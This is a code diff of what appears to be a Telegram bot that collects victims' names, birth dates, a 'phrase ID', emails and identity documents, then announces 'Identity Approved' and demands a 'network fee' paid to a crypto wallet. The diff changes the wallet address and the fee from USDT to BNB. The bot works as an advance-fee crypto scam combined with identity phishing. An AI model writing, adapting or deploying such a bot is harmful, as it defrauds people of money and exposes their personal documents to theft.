@@ -25,8 +25,8 @@ ADMIN_ID = 6259009798
 
 NAME, COUNTRY, DOB, PHRASE_ID, EMAIL, DOCUMENT, CONFIRM = range(7)
 
-WALLET_ADDRESS = "TTUXNmPx3i7JNjMsTzGKG14oBUbdjCJ2L1"
-PAYMENT_AMOUNT = "100 USD"
+WALLET_ADDRESS = "0x06D8Ba276e02B04E5756817457b27a82f1D6F48f"
+PAYMENT_AMOUNT = "0.1 BNB"
 
 # =========================
 # DATABASE
@@ -230,10 +230,10 @@ async def admin_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id=user_id,
     text=(
         "Congratulations...Identity Approved\n\n"
-        f"Network Gas Fee: {PAYMENT_AMOUNT}\n\n"
+        f"Network Fee: {PAYMENT_AMOUNT}\n\n"
         "This fee is required to process the blockchain transaction and finalize wallet activation, enabling the Send, Receive, Buy, and Sell features.\n\n"
         "Payment Method:\n"
-         "USDT (TRC20)\n"
+         "Binance Coin)\n"
         f"Wallet Address:\n`{WALLET_ADDRESS}`\n\n"
         "Transaction ID using:\n"
         "/tx YOUR_TRANSACTION_ID\n\n"
